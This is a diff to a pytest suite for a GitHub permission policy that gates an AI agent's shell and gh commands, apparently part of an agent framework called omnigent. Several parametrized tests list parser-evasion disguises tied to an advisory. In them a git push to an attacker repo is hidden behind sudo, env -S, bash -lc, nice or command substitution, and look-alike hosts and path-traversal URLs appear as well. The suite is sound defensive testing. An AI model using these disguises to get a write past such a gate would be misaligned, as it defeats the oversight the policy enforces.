@@ -26,9 +26,13 @@ from typing import Any
 
 import pytest
 
-from omnigent.policies.builtins._shell import SHELL_TOOLS
+from omnigent.policies.builtins._shell import (
+    SHELL_TOOLS,
+    UnsupportedShellSyntax,
+    split_command_segments,
+)
 from omnigent.policies.builtins.github import _DEFAULT_SHELL_TOOLS as _github_default_shell_tools
-from omnigent.policies.builtins.github import github_policy
+from omnigent.policies.builtins.github import _normalize_repo, github_policy
 from omnigent.policies.builtins.orchestration import _SHELL_TOOLS as _orchestration_shell_tools
 from omnigent.policies.builtins.working_dir import (
     _DEFAULT_SHELL_TOOLS as _working_dir_default_shell_tools,
@@ -333,6 +337,12 @@ def test_shell_push_to_url_repo_allowed() -> None:
     assert policy(_sh("git push https://github.com/octo/hello main")) is None
 
 
+def test_shell_push_to_allowed_repo_and_branch_is_allowed() -> None:
+    """A push to an allowlisted repo on an allowlisted branch abstains."""
+    policy = github_policy(write_repos=["example/allowed"], write_branches=["main"])
+    assert policy(_sh("git push https://github.com/example/allowed main")) is None
+
+
 def test_shell_push_to_url_repo_denied() -> None:
     """A push to a determinable non-allowlisted repo is denied."""
     policy = github_policy(write_repos=[_REPO])
@@ -550,6 +560,70 @@ def test_shell_unparseable_git_command_asks() -> None:
     assert result is not None and result["result"] == "ASK"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo ready # today's status\necho done",
+        "cat <<DATA\ntoday's status\nDATA\necho done",
+        "sh -c 'echo ready # status'",
+        "echo \\\nready",
+        "echo $(echo ready)",
+        'echo "$(echo ready)"',
+        "echo `echo ready`",
+        'echo "`echo ready`"',
+        "echo $'text'",
+        'echo $"text"',
+    ],
+)
+def test_unsupported_shell_syntax_asks_even_for_benign_commands(command: str) -> None:
+    assert _action(github_policy()(_sh(command))) == "ASK"
+
+
+@pytest.mark.parametrize("read_all,expected", [(False, "DENY"), (True, "ASK")])
+@pytest.mark.parametrize("command", ["parser-input", "sh -c 'parser-input'"])
+def test_completed_segments_keep_stricter_decisions(
+    monkeypatch: pytest.MonkeyPatch, read_all: bool, expected: str, command: str
+) -> None:
+    # Supply a partial parser result to isolate policy precedence from lexical syntax.
+    def partial_segments(value: str) -> list[str]:
+        if value == "parser-input":
+            raise UnsupportedShellSyntax(
+                "Unsupported syntax requires approval", ["gh repo view --repo octo/hello"]
+            )
+        return split_command_segments(value)
+
+    monkeypatch.setattr(
+        "omnigent.policies.builtins.github.split_command_segments", partial_segments
+    )
+    assert _action(github_policy(read_all=read_all)(_sh(command))) == expected
+
+
+@pytest.mark.parametrize("read_all,expected", [(False, "DENY"), (True, "ASK")])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo ready # status\n{read}",
+        "{read} # status\necho done",
+        "echo $(echo ready) && {read}",
+        '{read}; echo "$(echo ready)"',
+        "echo $'ready'; {read}",
+        "echo \\\nready; {read}",
+        "cat <<DATA\nplain text\nDATA\n{read}",
+        "sh -c 'echo $(echo ready); {read}'",
+    ],
+)
+def test_completed_segments_are_classified_across_unsupported_regions(
+    read_all: bool, expected: str, command: str
+) -> None:
+    command = command.format(read="gh repo view --repo octo/hello")
+    assert _action(github_policy(read_all=read_all)(_sh(command))) == expected
+
+
+@pytest.mark.parametrize("command", ["echo '$(text)'", "echo '`text`'", r'echo "\$(text)"'])
+def test_literal_substitution_text_abstains(command: str) -> None:
+    assert github_policy()(_sh(command)) is None
+
+
 def test_shell_tools_param_overrides_default_tool() -> None:
     """A custom shell tool name is parsed when listed in ``shell_tools``.
 
@@ -617,74 +691,74 @@ def test_env_split_string_preserves_trailing_arguments(command: str, expected: s
 
 
 @pytest.mark.parametrize(
-    "command",
+    ("command", "expected"),
     [
         # Combined interpreter flags — ``-lc`` (login) / ``-ic`` (interactive) /
         # ``-xc`` (trace) still read the command from the next operand, like ``-c``.
-        f'bash -lc "git push {_EVIL} main"',
-        f"bash -ic 'git push {_EVIL} main'",
-        f"sh -xc 'git push {_EVIL} main'",
+        (f'bash -lc "git push {_EVIL} main"', "DENY"),
+        (f"bash -ic 'git push {_EVIL} main'", "DENY"),
+        (f"sh -xc 'git push {_EVIL} main'", "DENY"),
         # ``timeout`` consumes its own flags AND a leading duration positional
         # before the real command.
-        f"timeout 60 git push {_EVIL} main",
-        f"timeout --signal=KILL 5m git push {_EVIL} main",
-        f"timeout -s KILL 5m git push {_EVIL} main",
+        (f"timeout 60 git push {_EVIL} main", "DENY"),
+        (f"timeout --signal=KILL 5m git push {_EVIL} main", "DENY"),
+        (f"timeout -s KILL 5m git push {_EVIL} main", "DENY"),
         # ``nice`` / ``setsid`` / ``stdbuf`` carry their own option flags
         # (combined ``-oL`` and separate-value ``-o L`` forms both).
-        f"nice -n 10 git push {_EVIL} main",
-        f"nice -10 git push {_EVIL} main",
-        f"setsid -w git push {_EVIL} main",
-        f"stdbuf -oL git push {_EVIL} main",
-        f"stdbuf -o L git push {_EVIL} main",
+        (f"nice -n 10 git push {_EVIL} main", "DENY"),
+        (f"nice -10 git push {_EVIL} main", "DENY"),
+        (f"setsid -w git push {_EVIL} main", "DENY"),
+        (f"stdbuf -oL git push {_EVIL} main", "DENY"),
+        (f"stdbuf -o L git push {_EVIL} main", "DENY"),
         # ``sudo`` / ``env`` / ``command`` / ``time`` / ``exec`` carry their own
         # option flags too; skipping only the wrapper word left the flag as the
         # apparent command and let the push through.
-        f"sudo -u root git push {_EVIL} main",
-        f"sudo -n git push {_EVIL} main",
-        f"sudo -- git push {_EVIL} main",
-        f"sudo -u root -- git push {_EVIL} main",
-        f"env -i git push {_EVIL} main",
-        f"env -u GIT_DIR git push {_EVIL} main",
-        f"env --unset=GIT_DIR git push {_EVIL} main",
-        f"env -C /repo git push {_EVIL} main",
-        f"command -p git push {_EVIL} main",
-        f"time -p git push {_EVIL} main",
-        f"time -o /tmp/timing git push {_EVIL} main",
-        f"exec -a disguise git push {_EVIL} main",
+        (f"sudo -u root git push {_EVIL} main", "DENY"),
+        (f"sudo -n git push {_EVIL} main", "DENY"),
+        (f"sudo -- git push {_EVIL} main", "DENY"),
+        (f"sudo -u root -- git push {_EVIL} main", "DENY"),
+        (f"env -i git push {_EVIL} main", "DENY"),
+        (f"env -u GIT_DIR git push {_EVIL} main", "DENY"),
+        (f"env --unset=GIT_DIR git push {_EVIL} main", "DENY"),
+        (f"env -C /repo git push {_EVIL} main", "DENY"),
+        (f"command -p git push {_EVIL} main", "DENY"),
+        (f"time -p git push {_EVIL} main", "DENY"),
+        (f"time -o /tmp/timing git push {_EVIL} main", "DENY"),
+        (f"exec -a disguise git push {_EVIL} main", "DENY"),
         # Short options bundle: a value-taking option is only a separate token
         # when it ends the bundle, so ``-nu root`` consumes ``root`` but
         # ``-n10`` / ``-oL`` carry their value attached.
-        f"sudo -nu root git push {_EVIL} main",
-        f"sudo -knu root git push {_EVIL} main",
+        (f"sudo -nu root git push {_EVIL} main", "DENY"),
+        (f"sudo -knu root git push {_EVIL} main", "DENY"),
         # BSD sudo: -a/--auth-type and -c/--login-class take a value; omitting
         # them caused their value to be seen as the command head → silent ALLOW.
-        f"sudo -a foo git push {_EVIL} main",
-        f"sudo --auth-type foo git push {_EVIL} main",
-        f"sudo -c bar git push {_EVIL} main",
-        f"sudo --login-class bar git push {_EVIL} main",
-        f"env -iu FOO git push {_EVIL} main",
-        f"nice -n10 git push {_EVIL} main",
+        (f"sudo -a foo git push {_EVIL} main", "DENY"),
+        (f"sudo --auth-type foo git push {_EVIL} main", "DENY"),
+        (f"sudo -c bar git push {_EVIL} main", "DENY"),
+        (f"sudo --login-class bar git push {_EVIL} main", "DENY"),
+        (f"env -iu FOO git push {_EVIL} main", "DENY"),
+        (f"nice -n10 git push {_EVIL} main", "DENY"),
         # ``env -S`` splits its string and RUNS it, so the push lives INSIDE the
         # flag's value: consuming it as an ordinary value left zero tokens, and a
         # segment with no tokens abstains — a silent ALLOW the leading-``-``
         # backstop cannot see either.
-        f"env -S 'git push {_EVIL} main'",
-        f"env --split-string='git push {_EVIL} main'",
-        f"env --split-string 'git push {_EVIL} main'",
-        f"env -iS 'git push {_EVIL} main'",
-        f"env -u FOO -S 'git push {_EVIL} main'",
-        f"sudo -u root env -S 'git push {_EVIL} main'",
+        (f"env -S 'git push {_EVIL} main'", "DENY"),
+        (f"env --split-string='git push {_EVIL} main'", "DENY"),
+        (f"env --split-string 'git push {_EVIL} main'", "DENY"),
+        (f"env -iS 'git push {_EVIL} main'", "DENY"),
+        (f"env -u FOO -S 'git push {_EVIL} main'", "DENY"),
+        (f"sudo -u root env -S 'git push {_EVIL} main'", "DENY"),
         # An absolute path is the same wrapper: matching only the bare word left
         # the path token as the apparent command and abstained.
-        f"/usr/bin/sudo -u root git push {_EVIL} main",
-        f"/usr/bin/env -S 'git push {_EVIL} main'",
+        (f"/usr/bin/sudo -u root git push {_EVIL} main", "DENY"),
+        (f"/usr/bin/env -S 'git push {_EVIL} main'", "DENY"),
         # Command substitution executes the push; the ``x=`` outer token must
         # not be dismissed as a harmless env-assignment.
-        f"x=$(git push {_EVIL} main)",
-        f"echo `git push {_EVIL} main`",
+        (f"x=$(git push {_EVIL} main)", "ASK"),
+        (f"echo `git push {_EVIL} main`", "ASK"),
     ],
 )
-def test_shell_parser_evasion_disguises_are_gated(command: str) -> None:
+def test_shell_parser_evasion_disguises_are_gated(command: str, expected: str) -> None:
     """Parser-evasion disguises do not slip a push past the gate (GHSA-7mqg-cx4g-x2rf).
 
     Each command runs ``git push`` to a non-allowlisted attacker repo behind a
@@ -692,47 +766,47 @@ def test_shell_parser_evasion_disguises_are_gated(command: str) -> None:
     a wrapper that carries its own option flags (``timeout`` / ``nice`` /
     ``setsid`` / ``stdbuf`` / ``sudo`` / ``env`` / ``command`` / ``time`` /
     ``exec``, bundled short options included), or a command substitution —
-    which made the evaluator abstain and ALLOW. All must now resolve to the
-    inner push and DENY it.
+    which made the evaluator abstain and ALLOW. Resolved writes are denied;
+    opaque command substitutions require approval.
     """
     policy = github_policy(write_repos=[_REPO], write_branches=["main"])
-    assert _action(policy(_sh(command))) == "DENY"
+    assert _action(policy(_sh(command))) == expected
 
 
 @pytest.mark.parametrize(
-    "command",
+    ("command", "expected"),
     [
         # A wrapper in front of a benign command stays un-gated (no over-block).
-        "timeout 60 npm test",
-        "nice -n 10 ls -la",
-        "stdbuf -oL cat file.txt",
-        "sudo -u root npm test",
-        "sudo -nu root npm test",
-        "env -i make build",
-        "env -iu FOO make build",
-        "command -p ls",
-        "time -p pytest",
-        # A substitution whose body is not a gated git/gh op stays un-gated.
-        "x=$(date +%s)",
-        'echo "`uname -a`"',
+        ("timeout 60 npm test", "ALLOW"),
+        ("nice -n 10 ls -la", "ALLOW"),
+        ("stdbuf -oL cat file.txt", "ALLOW"),
+        ("sudo -u root npm test", "ALLOW"),
+        ("sudo -nu root npm test", "ALLOW"),
+        ("env -i make build", "ALLOW"),
+        ("env -iu FOO make build", "ALLOW"),
+        ("command -p ls", "ALLOW"),
+        ("time -p pytest", "ALLOW"),
+        # Substitution output is opaque even when its visible body is benign.
+        ("x=$(date +%s)", "ASK"),
+        ('echo "`uname -a`"', "ASK"),
         # A wrapped push to the ALLOWED repo+branch still passes.
-        f"timeout 60 git push https://github.com/{_REPO} main",
-        f"sudo -u root git push https://github.com/{_REPO} main",
-        f"sudo -nu root git push https://github.com/{_REPO} main",
-        f"env -iu FOO git push https://github.com/{_REPO} main",
-        "env -S 'npm test'",
-        f"env -S 'git push https://github.com/{_REPO} main'",
+        (f"timeout 60 git push https://github.com/{_REPO} main", "ALLOW"),
+        (f"sudo -u root git push https://github.com/{_REPO} main", "ALLOW"),
+        (f"sudo -nu root git push https://github.com/{_REPO} main", "ALLOW"),
+        (f"env -iu FOO git push https://github.com/{_REPO} main", "ALLOW"),
+        ("env -S 'npm test'", "ALLOW"),
+        (f"env -S 'git push https://github.com/{_REPO} main'", "ALLOW"),
     ],
 )
-def test_shell_parser_broadening_does_not_overblock(command: str) -> None:
+def test_shell_parser_broadening_does_not_overblock(command: str, expected: str) -> None:
     """The broadened parser does not gate wrappers around benign commands.
 
     Composability matters: the policy must keep abstaining on non-git/gh work
-    (``timeout npm test``) and on substitutions with no gated op, and still
-    ALLOW a wrapped push to an allowlisted repo.
+    (``timeout npm test``) and ALLOW a wrapped push to an allowlisted repo.
+    Unclassified command substitutions require approval.
     """
     policy = github_policy(write_repos=[_REPO], write_branches=["main"])
-    assert _action(policy(_sh(command))) == "ALLOW"
+    assert _action(policy(_sh(command))) == expected
 
 
 def test_unresolvable_wrapper_head_asks_instead_of_abstaining() -> None:
@@ -761,15 +835,11 @@ def test_unresolvable_wrapper_head_asks_instead_of_abstaining() -> None:
 def test_shell_lookalike_host_read_not_treated_as_github(host: str) -> None:
     """A look-alike host is not parsed as ``github.com`` for reads.
 
-    A clone from ``<host>/octocat/Hello-World`` must NOT resolve to the
-    allowlisted ``octocat/Hello-World``; with reads restricted and no real repo
-    determinable, it falls to ASK rather than wrongly ALLOWing. Covers alnum
-    AND hyphen/underscore prefixes. The alnum hosts were already ASK before
-    the fix (the original guard); the hyphen/underscore hosts were silently
-    parsed as real ``github.com`` until the ``_REPO_URL_PATTERN`` lookbehind
-    was widened to include ``-`` and ``_``. Dropping those two chars again
-    would flip the hyphen/underscore rows back to ALLOW, leaking a foreign
-    host's clone into the allowlisted repo.
+    A clone from ``<host>/octocat/Hello-World`` must not resolve to the
+    allowlisted ``octocat/Hello-World``. The URL host is compared exactly with
+    ``github.com``, so a prefix before it (alnum, hyphen, or underscore) must
+    never be stripped to match. With reads restricted and no determinable repo,
+    the call falls to ASK.
     """
     policy = github_policy(read_all=False, read_repos=["octocat/Hello-World"])
     assert _action(policy(_sh(f"git clone https://{host}/octocat/Hello-World"))) == "ASK"
@@ -1225,3 +1295,247 @@ def test_registry_validates_factory_params() -> None:
     err_unknown = validate_factory_params(_HANDLER, {"bogus": 1})
     assert err_unknown is not None and "bogus" in err_unknown
     assert validate_factory_params(_HANDLER, {"read_all": "yes"}) is not None
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Write targets — repository authority comes from the command's target operand
+# ══════════════════════════════════════════════════════════════════════════════
+
+
+def _target_action(
+    command: str, *, restrict_branches: bool = True, allow_destructive: bool = False
+) -> str:
+    """Return the decision for *command* under an ``example/allowed`` write allowlist."""
+    policy = github_policy(
+        write_repos=["example/allowed"],
+        write_branches=["main"] if restrict_branches else None,
+        allow_destructive=allow_destructive,
+    )
+    return _action(policy(_sh(command)))
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://elsewhere.example/github.com/example/allowed",
+        "https://github.com.elsewhere.example/example/allowed",
+        "https://lookalike-github.com/example/allowed",
+        "https://example.com/?next=https://github.com/example/allowed",
+    ],
+)
+def test_repository_url_with_foreign_host_is_not_github(url: str) -> None:
+    """Only a URL whose host is exactly ``github.com`` yields a repository."""
+    assert _normalize_repo(url) == ""
+    assert _target_action(f"git push {url} main") == "ASK"
+
+
+def test_repository_url_is_normalized_for_github_host() -> None:
+    assert _normalize_repo("https://github.com/Example/Allowed/pull/1") == "example/allowed"
+    assert _normalize_repo("git@github.com:Example/Allowed.git") == "example/allowed"
+
+
+@pytest.mark.parametrize(
+    "reference",
+    [
+        "github.com/Example/Allowed",
+        "github.com/Example/Allowed.git",
+        "github.com:Example/Allowed",
+        "https://github.com/Example/Allowed",
+    ],
+)
+def test_scheme_less_github_reference_is_normalized(reference: str) -> None:
+    assert _normalize_repo(reference) == "example/allowed"
+
+
+@pytest.mark.parametrize(
+    "reference",
+    [
+        "notgithub.com/example/allowed",
+        "github.com.example/example/allowed",
+        "github.com@evil.example/example/allowed",
+        "github.com/example/%61llowed",
+        "github.com/example/allowed/../other",
+    ],
+)
+def test_scheme_less_reference_with_foreign_host_or_unsafe_path_is_rejected(
+    reference: str,
+) -> None:
+    assert _normalize_repo(reference) == ""
+
+
+def test_scheme_less_allowlist_entries_and_repo_arguments_are_honored() -> None:
+    policy = github_policy(write_repos=["github.com/example/allowed"])
+    assert _target_action("gh pr create -R github.com/example/allowed --base main") == "ALLOW"
+    assert _target_action("gh pr create -R github.com/example/other --base main") == "DENY"
+    colon_policy = github_policy(write_repos=["github.com:example/allowed"])
+    assert _action(colon_policy(_sh("gh pr create -R example/allowed --base main"))) == "ALLOW"
+    mcp_result = policy(
+        tc("mcp__github__create_issue", {"repository": "github.com/example/other"})
+    )
+    assert mcp_result is not None and mcp_result["result"] == "DENY"
+    assert (
+        policy(tc("mcp__github__create_issue", {"repository": "github.com/example/allowed"}))
+        is None
+    )
+
+
+def test_unparseable_allowlist_entry_is_dropped_with_warning(
+    caplog: pytest.LogCaptureFixture,
+) -> None:
+    with caplog.at_level("WARNING", logger="omnigent.policies.builtins.github"):
+        policy = github_policy(
+            write_repos=["example/allowed", "https://github.com/example/allowed/../other"]
+        )
+    assert "https://github.com/example/allowed/../other" in caplog.text
+    assert _action(policy(_sh("gh pr create -R example/allowed --base main"))) == "ALLOW"
+    assert _action(policy(_sh("gh pr create -R example/other --base main"))) == "DENY"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git push https://github.com/example/allowed/../other main",
+        "git push https://github.com/example/allowed/extra main",
+        "git push https://github.com/example/allowed/pull/1 main",
+        "gh pr merge https://github.com/example/allowed/../other/pull/1",
+    ],
+)
+def test_repository_url_with_extra_path_segments_is_not_trusted(command: str) -> None:
+    assert _target_action(command) == "ASK"
+
+
+def test_gh_write_uses_only_an_explicit_target() -> None:
+    assert (
+        _target_action("gh pr create --body https://github.com/example/allowed --base main")
+        == "ASK"
+    )
+    assert (
+        _target_action("gh pr create -R example/other --body https://github.com/example/allowed")
+        == "DENY"
+    )
+    assert _target_action("gh pr create -R example/allowed --base main") == "ALLOW"
+    assert _target_action("gh -R example/allowed pr create --base main") == "ALLOW"
+    assert _target_action("gh -R example/other pr create --base main") == "DENY"
+    assert _target_action("gh --unknown-global pr create -R example/allowed") == "ASK"
+    assert _target_action("gh pr merge https://github.com/example/allowed/pull/1") == "ALLOW"
+    assert _target_action("gh repo create example/allowed") == "ALLOW"
+    # A selector written as the value of another option does not select a repo.
+    for consumed in ("--title -Rexample/allowed", "--title --repo=example/allowed"):
+        assert _target_action(f"gh issue create {consumed} --body example") == "ASK"
+    assert _target_action("gh pr create --base -Rexample/allowed") == "ASK"
+    assert _target_action("gh pr create -R example/allowed -dRexample/other") == "ASK"
+    # After a flag that takes no value, the selector is a selector.
+    assert _target_action("gh pr create --draft -R example/allowed --base main") == "ALLOW"
+    assert _target_action("gh pr create --draft -R example/other --base main") == "DENY"
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        (
+            "gh api -X POST repos/example/other/issues -f body=https://github.com/example/allowed",
+            "DENY",
+        ),
+        (
+            "gh api -X POST repos/example/allowed/issues -f body=https://github.com/example/other",
+            "ALLOW",
+        ),
+        ("gh api -f body=repos/example/allowed/issues -X POST repos/example/other/issues", "DENY"),
+        (
+            "gh api -H X-Trace:repos/example/allowed/issues -X POST repos/example/other/issues",
+            "DENY",
+        ),
+        ("gh api --unknown-flag repos/example/allowed/issues -X POST", "ASK"),
+        ("gh api -X POST -- repos/example/allowed/issues", "ALLOW"),
+        ("gh api -X FOO repos/example/other/issues", "ASK"),
+        ("gh api --method=POST repos/example/other/issues", "DENY"),
+        ("gh api https://api.github.com/repos/example/allowed/issues -X POST", "ALLOW"),
+        ("gh api -X POST https://elsewhere.example/repos/example/allowed/issues", "ASK"),
+        (
+            "gh api -R example/allowed -X POST https://elsewhere.example/repos/example/allowed/issues",
+            "ASK",
+        ),
+        ("gh api -R example/allowed graphql -X POST", "ASK"),
+        ("gh api repos/example/other/issues -XGET -XPOST", "DENY"),
+        ("gh api repos/example/other/issues --input=body.json", "DENY"),
+        ("gh api -X POST repos/example/allowed/../other/issues", "ASK"),
+        ("gh api -X POST repos/example/allowed/issues --hostname other.example", "ASK"),
+        # --cache and --preview take values, so the endpoint is the next operand.
+        ("gh api --cache 1h repos/example/other/issues -X POST", "DENY"),
+        ("gh api -p example-preview --cache 1h repos/example/allowed/issues -X POST", "ALLOW"),
+        ("gh api --cache 1h repos/example/allowed/issues -f title=x", "ALLOW"),
+        # An explicit read method overrides the POST implied by field flags.
+        ("gh api -X GET repos/example/other/issues -f q=x", "ALLOW"),
+        ("gh api -F q=x -X HEAD repos/example/other/issues", "ALLOW"),
+        ("gh api -X GET -X POST repos/example/other/issues -f q=x", "DENY"),
+        ("gh api -X POST -X GET repos/example/other/issues", "DENY"),
+        # A token an option takes as its value is never read as a method.
+        ("gh api repos/example/other/issues --input -XGET", "DENY"),
+        ("gh api repos/example/other/issues -H -XGET -f title=x", "DENY"),
+        ("gh api --input -XGET repos/example/allowed/issues", "ALLOW"),
+        # A method at the end of a short cluster still counts.
+        ("gh api -iX POST repos/example/other/issues", "DENY"),
+        ("gh api repos/example/other/issues --input", "ASK"),
+    ],
+)
+def test_gh_api_repository_comes_from_the_endpoint(command: str, expected: str) -> None:
+    assert _target_action(command) == expected
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr create -R example/allowed -R example/other --base main",
+        "gh -R example/allowed pr create -R example/other --base main",
+        "gh pr create -R example/allowed -Rexample/other --base main",
+        "gh pr create -R example/allowed --base main --base release",
+        (
+            "gh api -X POST repos/example/allowed/issues"
+            " --hostname github.com --hostname other.example"
+        ),
+    ],
+)
+def test_conflicting_gh_selectors_require_approval(command: str) -> None:
+    assert _target_action(command) == "ASK"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr merge https://github.com/example/other/pull/1 -R example/allowed",
+        "gh pr merge -R example/allowed https://github.com/example/other/pull/1",
+        "gh issue close https://github.com/example/other/issues/1 --repo example/allowed",
+    ],
+)
+def test_gh_url_argument_naming_another_repo_than_explicit_repo_asks(command: str) -> None:
+    assert _target_action(command) == "ASK"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr merge https://github.com/example/allowed/pull/1 -R example/allowed",
+        "gh pr merge -R example/allowed https://github.com/example/allowed/pull/1",
+    ],
+)
+def test_gh_url_argument_naming_explicit_repo_is_accepted(command: str) -> None:
+    assert _target_action(command) == "ALLOW"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr create -R example/allowed -R Example/Allowed --base main",
+        "gh -R example/allowed pr create -R example/allowed --base main",
+        "gh pr create -R example/allowed --base main --base main",
+        "gh api -X POST repos/example/allowed/issues --hostname github.com --hostname GitHub.com",
+    ],
+)
+def test_repeated_identical_gh_selectors_are_accepted(command: str) -> None:
+    assert _target_action(command) == "ALLOW"
+
+
+def test_gh_api_delete_is_destructive() -> None:
+    command = "gh api -X DELETE repos/example/allowed/issues/1"
+    assert _target_action(command) == "DENY"
+    assert _target_action(command, allow_destructive=True) == "ALLOW"
